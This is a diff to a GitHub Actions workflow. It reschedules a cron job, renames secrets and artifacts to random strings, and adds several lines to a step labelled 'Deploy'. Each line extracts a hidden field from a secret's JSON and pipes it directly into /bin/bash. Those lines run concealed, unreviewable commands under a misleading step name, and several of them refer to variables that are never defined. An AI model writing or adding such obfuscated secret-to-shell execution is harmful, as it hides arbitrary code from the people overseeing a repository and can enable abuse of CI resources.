@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '25 5,11,17,23 * * *'
+    - cron: '19 0,6,12,18 * * *'
 permissions:
   contents: read
 jobs:
@@ -16,14 +16,18 @@ jobs:
           fetch-depth: 1
       - name: Deploy
         env:
-          x550: ${{ secrets.x550 }}
+          tl50672: ${{ secrets.tl50672 }}
         run: |
-          printf '%s' "$x550" | jq -r .xst799 | /bin/bash
-          printf '%s' "$vkhp72" | jq -r .cipw97521 | /bin/bash
+          printf '%s' "$tl50672" | jq -r .izzsy12 | /bin/bash
+          echo $tqqmy86 | jq -r .dsvd7570 | /bin/bash
+          printf '%s' "$eljbz8455" | jq -r .hnwt61035 | /bin/bash
+          printf '%s' "$na2" | jq -r .d29135 | /bin/bash
+          printf '%s' "$v10468" | jq -r .p4 | /bin/bash
+          printf '%s' "$tz2" | jq -r .h10775 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: kgcauFhB
+          name: zi0fpX2N
           path: "*.zip"
           retention-days: 1
